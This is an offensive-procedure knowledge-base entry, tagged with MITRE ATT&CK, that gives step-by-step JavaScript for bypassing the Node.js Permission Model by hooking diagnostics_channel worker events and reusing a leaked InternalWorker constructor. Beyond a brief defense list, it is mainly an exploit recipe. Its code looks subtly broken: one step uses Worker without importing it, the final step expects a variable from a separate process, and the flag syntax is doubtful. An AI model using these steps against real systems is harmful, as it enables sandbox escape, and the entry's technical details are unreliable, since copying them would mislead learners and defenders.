---
tags:
  - node.js
  - permission-bypass
  - worker-threads
  - access-control
type: procedure
tools:
  - '[[tools/diagnostics_channel]]'
tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
commands: []
verified: false
platforms:
  - Node.js
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:30:07.344Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: c26bd7e2-f8e6-44d7-aa62-2160b9df13b1
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Privilege Escalation]]'
---
# Bypass Node.js Worker Permissions Using Diagnostics Channel

## Summary

This procedure exploits a vulnerability in Node.js where InternalWorker instances are leaked through the diagnostics_channel utility, allowing attackers to hook into worker thread creation events, extract constructors, and reinstate them to bypass the Permission Model (--experimental-permission flag). It enables unauthorized execution or access in restricted Node.js environments, affecting versions v20, v22, and v23 (CVE-2025-23083, CVE-2025-23090).

## Description

In Node.js environments using worker threads with permission restrictions, the diagnostics_channel module allows unrestricted hooking into diagnostic events like worker creation. By subscribing to the 'worker' event, attackers can access internal bindings, leak InternalWorker instances, and extract their constructors. These can then be reinstated to create new workers that ignore permission controls, leading to improper access control and potential execution of malicious code such as file reads or network requests in sandboxed contexts. This is particularly dangerous in serverless or containerized Node.js deployments where permissions are enforced to limit damage.

## Requirements

1. Node.js version v20, v22, or v23 with worker threads enabled
2. --experimental-permission=npii flag active in the target runtime
3. Ability to execute custom JavaScript code in the Node.js process (e.g., via RCE or script injection)
4. A simple worker script (e.g., simple-worker.js) to trigger events

## Defense

Defensive measures and detection strategies:

- Disable or restrict diagnostics_channel subscriptions in production environments
- Use strict permission policies and monitor worker thread creations via runtime logs
- Update to patched Node.js versions once available; audit custom worker implementations
- Implement runtime integrity checks to detect constructor manipulations

## Objectives

1. Leak InternalWorker instances to access restricted internals
2. Bypass Permission Model for unauthorized worker execution
3. Achieve code execution or data access in restricted contexts

## Instructions

### Step 1: Subscribe to Worker Diagnostic Events

**Context**: Hook into the diagnostics_channel to capture worker thread creation messages, enabling access to internal data.

Execute the following Node.js code to subscribe and log events:

```javascript
const diagnostics = require('diagnostics_channel');
diagnostics.subscribe('worker', (msg) => {
  console.log('Captured worker message:', msg);
});
const { Worker } = require('worker_threads');
new Worker('./simple-worker.js'); // Trigger event
```

> This command outputs worker event details, including internal bindings. Ensure simple-worker.js exists (e.g., console.log('Worker running');).

### Step 2: Extract Leaked InternalWorker Constructors

**Context**: From the hooked message, retrieve and store the InternalWorker constructor for later reinstatement.

Run this extended script to extract the constructor:

```javascript
const diagnostics = require('diagnostics_channel');
diagnostics.subscribe('worker', (msg) => {
  if (msg.internalBinding && msg.internalBinding.Worker) {
    const internalWorker = msg.internalBinding.Worker;
    const ctor = internalWorker.constructor;
    global.leakedWorkerCtor = ctor;
    console.log('Constructor extracted:', ctor.name);
  }
});
new Worker('./simple-worker.js');
```

> Successful extraction logs the constructor name (e.g., 'InternalWorker'). The global variable stores it for use.

### Step 3: Reinstate Constructor for Permission Bypass

**Context**: Use the leaked constructor to spawn a worker that evades permission checks, allowing restricted operations.

Execute with the --experimental-permission flag to test bypass:

```javascript
node --experimental-permission=npii -e `
// Use leakedWorkerCtor from previous step
const { Worker } = require('worker_threads');
try {
  const bypassed = new leakedWorkerCtor('./restricted-worker.js');
  console.log('Bypassed worker spawned');
} catch (err) {
  console.error('Bypass failed:', err);
}
`
```

> If successful, the worker runs without permission denials, e.g., executing fs.readFileSync in a no-file-access policy.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Privilege Escalation]]

### Techniques

- [[JavaScript]]
- [[Exploitation for Privilege Escalation]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/diagnostics_channel]]

## Tags

- node.js
- permission-bypass
- worker-threads
- access-control
